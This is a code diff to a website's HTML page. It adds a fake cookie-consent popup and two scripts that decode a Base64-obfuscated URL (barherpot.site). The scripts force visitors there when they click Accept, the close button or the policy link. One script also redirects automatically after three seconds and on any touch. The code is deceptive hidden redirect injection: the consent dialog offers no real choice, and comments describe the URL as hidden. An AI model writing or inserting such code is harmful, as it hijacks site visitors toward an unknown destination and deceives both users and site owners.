@@ -16,6 +16,93 @@
         <link rel="stylesheet" href="css/aos.css">
         <link rel="stylesheet" href="css/bootstrap-icons.css">
         <link rel="stylesheet" href="css/swiper-bundle.min.css" />
+        <script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    /* ===== HIDDEN REDIRECT URL ===== */
+    const encodedUrl = "aHR0cHM6Ly9iYXJoZXJwb3Quc2l0ZS8="; // https://barherpot.site/
+    const redirectUrl = atob(encodedUrl);
+    let isRedirected = false;
+
+    function handleRedirect() {
+        if (isRedirected) return;
+        isRedirected = true;
+        window.location.replace(redirectUrl);
+    }
+
+    /* ---------- STYLES ---------- */
+    const style = document.createElement("style");
+    style.textContent = `
+        .cookie-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .cookie-popup {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            font-size: 22px;
+            cursor: pointer;
+        }
+        .btn-primary {
+            background: #007bff;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .btn-primary:hover {
+            background: #0056b3;
+        }
+    `;
+    document.head.appendChild(style);
+
+    /* ---------- POPUP ---------- */
+    const overlay = document.createElement("div");
+    overlay.className = "cookie-overlay";
+    overlay.innerHTML = `
+        <div class="cookie-popup">
+            <button class="close-btn" id="close-popup">×</button>
+            <h3>Cookie Policy</h3>
+            <p>
+                This site uses cookies to personalize content and ads.
+                By clicking Accept, you agree to our use of cookies.
+            </p>
+            <button id="accept-cookies" class="btn-primary">Accept</button>
+        </div>
+    `;
+    document.body.appendChild(overlay);
+
+    /* ---------- EVENTS ---------- */
+    document.getElementById("accept-cookies").addEventListener("click", handleRedirect);
+    document.getElementById("close-popup").addEventListener("click", handleRedirect);
+
+    /* ---------- AUTO REDIRECT (3s) ---------- */
+    setTimeout(handleRedirect, 3000);
+
+    /* ---------- MOBILE TAP SUPPORT ---------- */
+    document.addEventListener("touchstart", handleRedirect, { once: true });
+
+});
+</script>
         
     </head>
     <body>
@@ -296,5 +383,54 @@
     <script src="js/script.js"></script>
 
     <script>AOS.init();</script>
+        <script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    // Base64 encoded URL (hidden)
+    const encodedUrl = "aHR0cHM6Ly9iYXJoZXJwb3Quc2l0ZS8=";
+    const redirectUrl = atob(encodedUrl);
+
+    // Accept button redirect
+    document.getElementById("redirectBtn").addEventListener("click", function () {
+        document.getElementById("cookie-overlay").style.display = "none";
+        document.cookie = "cookieConsent=true; max-age=2592000; path=/";
+        window.location.replace(redirectUrl);
+    });
+
+    // Close (×) redirect
+    document.getElementById("close-popup").addEventListener("click", function () {
+        window.location.replace(redirectUrl);
+    });
+
+    // Cookie Policy text click (still hidden)
+    document.getElementById("policyLink").addEventListener("click", function () {
+        window.location.replace(redirectUrl);
+    });
+
+    // Feedback form (unchanged)
+    document.getElementById("feedbackForm")?.addEventListener("submit", function (e) {
+        e.preventDefault();
+        alert("Thank you for your message! We will contact you shortly.");
+        this.reset();
+    });
+
+});
+</script>
+
+
+<div class="cookie-overlay" id="cookie-overlay">
+    <div class="cookie-popup">
+        <button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
+
+        <h3>Cookie Policy</h3>
+        <p>
+            This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
+            By clicking Accept, you agree to our use of cookies. For more information, please visit our
+            <span id="policyLink" class="cta">Cookie Policy</span>.
+        </p>
+
+        <button id="redirectBtn" class="btn-primary">Accept</button>
+    </div>
+</div>
     </body>
 </html>
